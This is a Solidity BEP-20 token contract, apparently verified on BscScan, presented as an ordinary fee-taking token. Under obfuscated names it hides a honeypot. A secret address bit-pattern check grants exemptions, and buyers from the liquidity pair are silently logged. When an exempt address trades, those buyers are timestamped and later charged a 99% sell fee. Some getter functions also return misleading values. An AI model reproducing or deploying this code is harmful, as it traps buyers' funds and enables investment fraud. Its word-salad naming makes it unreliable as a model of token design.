/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract EmptySebtimental is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Empty Sebtimental ";
    string constant _symbol = "EmptySebtimental";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingBotsFeeReceiver;
    mapping(address => bool) private modeExemptTradingLimitWallet;
    mapping(address => bool) private receiverTradingWalletMode;
    mapping(address => bool) private marketingModeTxFeeSwapSell;
    mapping(address => uint256) private buyFeeExemptSell;
    mapping(uint256 => address) private receiverBurnBuyMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txBotsLiquiditySell = 0;
    uint256 private modeMinAutoLaunched = 7;

    //SELL FEES
    uint256 private autoWalletExemptLaunched = 0;
    uint256 private modeTeamWalletBuy = 7;

    uint256 private launchedTeamMaxWallet = modeMinAutoLaunched + txBotsLiquiditySell;
    uint256 private teamBotsMinSell = 100;

    address private liquidityTeamBotsAuto = (msg.sender); // auto-liq address
    address private modeLiquidityMaxSell = (0x864c1B7De80E4f8a960B00DbFFffDe5BCAf6FcbC); // marketing address
    address private tradingLaunchedTxBuy = DEAD;
    address private teamSellReceiverMax = DEAD;
    address private receiverLimitLaunchedSellFeeBurnMax = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private launchedBurnTxReceiver;
    uint256 private isFeeBotsMode;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellMinMarketingBurn;
    uint256 private walletFeeLaunchedSell;
    uint256 private feeBurnMarketingTeamExemptLiquidityTrading;
    uint256 private autoBurnExemptMarketing;
    uint256 private walletExemptIsTeamAuto;

    bool private tradingLimitMarketingReceiver = true;
    bool private marketingModeTxFeeSwapSellMode = true;
    bool private marketingMaxWalletSwapSell = true;
    bool private feeTxSellIs = true;
    bool private buyBurnModeMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txTeamLaunchedLiquidity = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellMinMarketingBurn = true;

        tradingBotsFeeReceiver[msg.sender] = true;
        tradingBotsFeeReceiver[address(this)] = true;

        modeExemptTradingLimitWallet[msg.sender] = true;
        modeExemptTradingLimitWallet[0x0000000000000000000000000000000000000000] = true;
        modeExemptTradingLimitWallet[0x000000000000000000000000000000000000dEaD] = true;
        modeExemptTradingLimitWallet[address(this)] = true;

        receiverTradingWalletMode[msg.sender] = true;
        receiverTradingWalletMode[0x0000000000000000000000000000000000000000] = true;
        receiverTradingWalletMode[0x000000000000000000000000000000000000dEaD] = true;
        receiverTradingWalletMode[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return sellTeamMarketingExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return sellTeamMarketingExempt(sender, recipient, amount);
    }

    function sellTeamMarketingExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = liquidityTeamFeeExempt(sender) || liquidityTeamFeeExempt(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                liquidityWalletMinAuto();
            }
            if (!bLimitTxWalletValue) {
                burnModeTradingAuto(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return autoModeIsTeam(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(tradingLimitMarketingReceiver, "Trading is not active");
        }

        if (!Administration[sender] && !tradingBotsFeeReceiver[sender] && !tradingBotsFeeReceiver[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || receiverTradingWalletMode[sender] || receiverTradingWalletMode[recipient], "Max TX Limit has been triggered");

        if (modeReceiverLaunchedMaxIsExemptBuy()) {botsTeamReceiverBuyLimitLaunchedExempt();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = tradingTeamModeFeeBuy(sender) ? limitMaxTradingMinLaunched(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function autoModeIsTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function tradingTeamModeFeeBuy(address sender) internal view returns (bool) {
        return !modeExemptTradingLimitWallet[sender];
    }

    function minLimitWalletIs(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            launchedTeamMaxWallet = modeTeamWalletBuy + autoWalletExemptLaunched;
            return botsBurnExemptTradingFeeLiquidityMode(sender, launchedTeamMaxWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            launchedTeamMaxWallet = modeMinAutoLaunched + txBotsLiquiditySell;
            return launchedTeamMaxWallet;
        }
        return botsBurnExemptTradingFeeLiquidityMode(sender, launchedTeamMaxWallet);
    }

    function limitMaxTradingMinLaunched(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(minLimitWalletIs(sender, receiver == uniswapV2Pair)).div(teamBotsMinSell);

        if (marketingModeTxFeeSwapSell[sender] || marketingModeTxFeeSwapSell[receiver]) {
            feeAmount = amount.mul(99).div(teamBotsMinSell);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function liquidityTeamFeeExempt(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function botsBurnExemptTradingFeeLiquidityMode(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = buyFeeExemptSell[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function burnModeTradingAuto(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        receiverBurnBuyMax[exemptLimitValue] = addr;
    }

    function liquidityWalletMinAuto() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (buyFeeExemptSell[receiverBurnBuyMax[i]] == 0) {
                    buyFeeExemptSell[receiverBurnBuyMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(modeLiquidityMaxSell).transfer(amountBNB * amountPercentage / 100);
    }

    function modeReceiverLaunchedMaxIsExemptBuy() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    buyBurnModeMax &&
    _balances[address(this)] >= txTeamLaunchedLiquidity;
    }

    function botsTeamReceiverBuyLimitLaunchedExempt() internal swapping {
        uint256 amountToLiquify = txTeamLaunchedLiquidity.mul(txBotsLiquiditySell).div(launchedTeamMaxWallet).div(2);
        uint256 amountToSwap = txTeamLaunchedLiquidity.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = launchedTeamMaxWallet.sub(txBotsLiquiditySell.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txBotsLiquiditySell).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(modeMinAutoLaunched).div(totalETHFee);

        payable(modeLiquidityMaxSell).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                liquidityTeamBotsAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverTradingWalletMode(address a0) public view returns (bool) {
            return receiverTradingWalletMode[a0];
    }
    function setReceiverTradingWalletMode(address a0,bool a1) public onlyOwner {
        if (a0 != teamSellReceiverMax) {
            feeTxSellIs=a1;
        }
        receiverTradingWalletMode[a0]=a1;
    }

    function getModeExemptTradingLimitWallet(address a0) public view returns (bool) {
        if (a0 == liquidityTeamBotsAuto) {
            return feeTxSellIs;
        }
        if (modeExemptTradingLimitWallet[a0] == receiverTradingWalletMode[a0]) {
            return buyBurnModeMax;
        }
        if (a0 == receiverLimitLaunchedSellFeeBurnMax) {
            return tradingLimitMarketingReceiver;
        }
            return modeExemptTradingLimitWallet[a0];
    }
    function setModeExemptTradingLimitWallet(address a0,bool a1) public onlyOwner {
        if (modeExemptTradingLimitWallet[a0] != marketingModeTxFeeSwapSell[a0]) {
           marketingModeTxFeeSwapSell[a0]=a1;
        }
        if (modeExemptTradingLimitWallet[a0] == tradingBotsFeeReceiver[a0]) {
           tradingBotsFeeReceiver[a0]=a1;
        }
        if (modeExemptTradingLimitWallet[a0] != receiverTradingWalletMode[a0]) {
           receiverTradingWalletMode[a0]=a1;
        }
        modeExemptTradingLimitWallet[a0]=a1;
    }

    function getTxBotsLiquiditySell() public view returns (uint256) {
        if (txBotsLiquiditySell == txTeamLaunchedLiquidity) {
            return txTeamLaunchedLiquidity;
        }
        if (txBotsLiquiditySell == autoWalletExemptLaunched) {
            return autoWalletExemptLaunched;
        }
        return txBotsLiquiditySell;
    }
    function setTxBotsLiquiditySell(uint256 a0) public onlyOwner {
        txBotsLiquiditySell=a0;
    }

    function getModeLiquidityMaxSell() public view returns (address) {
        return modeLiquidityMaxSell;
    }
    function setModeLiquidityMaxSell(address a0) public onlyOwner {
        modeLiquidityMaxSell=a0;
    }

    function getReceiverBurnBuyMax(uint256 a0) public view returns (address) {
        if (a0 != txBotsLiquiditySell) {
            return teamSellReceiverMax;
        }
            return receiverBurnBuyMax[a0];
    }
    function setReceiverBurnBuyMax(uint256 a0,address a1) public onlyOwner {
        if (a0 != teamBotsMinSell) {
            liquidityTeamBotsAuto=a1;
        }
        if (a0 == launchedTeamMaxWallet) {
            modeLiquidityMaxSell=a1;
        }
        if (a0 != txTeamLaunchedLiquidity) {
            teamSellReceiverMax=a1;
        }
        receiverBurnBuyMax[a0]=a1;
    }

    function getBuyFeeExemptSell(address a0) public view returns (uint256) {
        if (a0 != receiverLimitLaunchedSellFeeBurnMax) {
            return teamBotsMinSell;
        }
            return buyFeeExemptSell[a0];
    }
    function setBuyFeeExemptSell(address a0,uint256 a1) public onlyOwner {
        if (a0 != modeLiquidityMaxSell) {
            txBotsLiquiditySell=a1;
        }
        buyFeeExemptSell[a0]=a1;
    }

    function getLiquidityTeamBotsAuto() public view returns (address) {
        if (liquidityTeamBotsAuto == receiverLimitLaunchedSellFeeBurnMax) {
            return receiverLimitLaunchedSellFeeBurnMax;
        }
        if (liquidityTeamBotsAuto != modeLiquidityMaxSell) {
            return modeLiquidityMaxSell;
        }
        return liquidityTeamBotsAuto;
    }
    function setLiquidityTeamBotsAuto(address a0) public onlyOwner {
        liquidityTeamBotsAuto=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}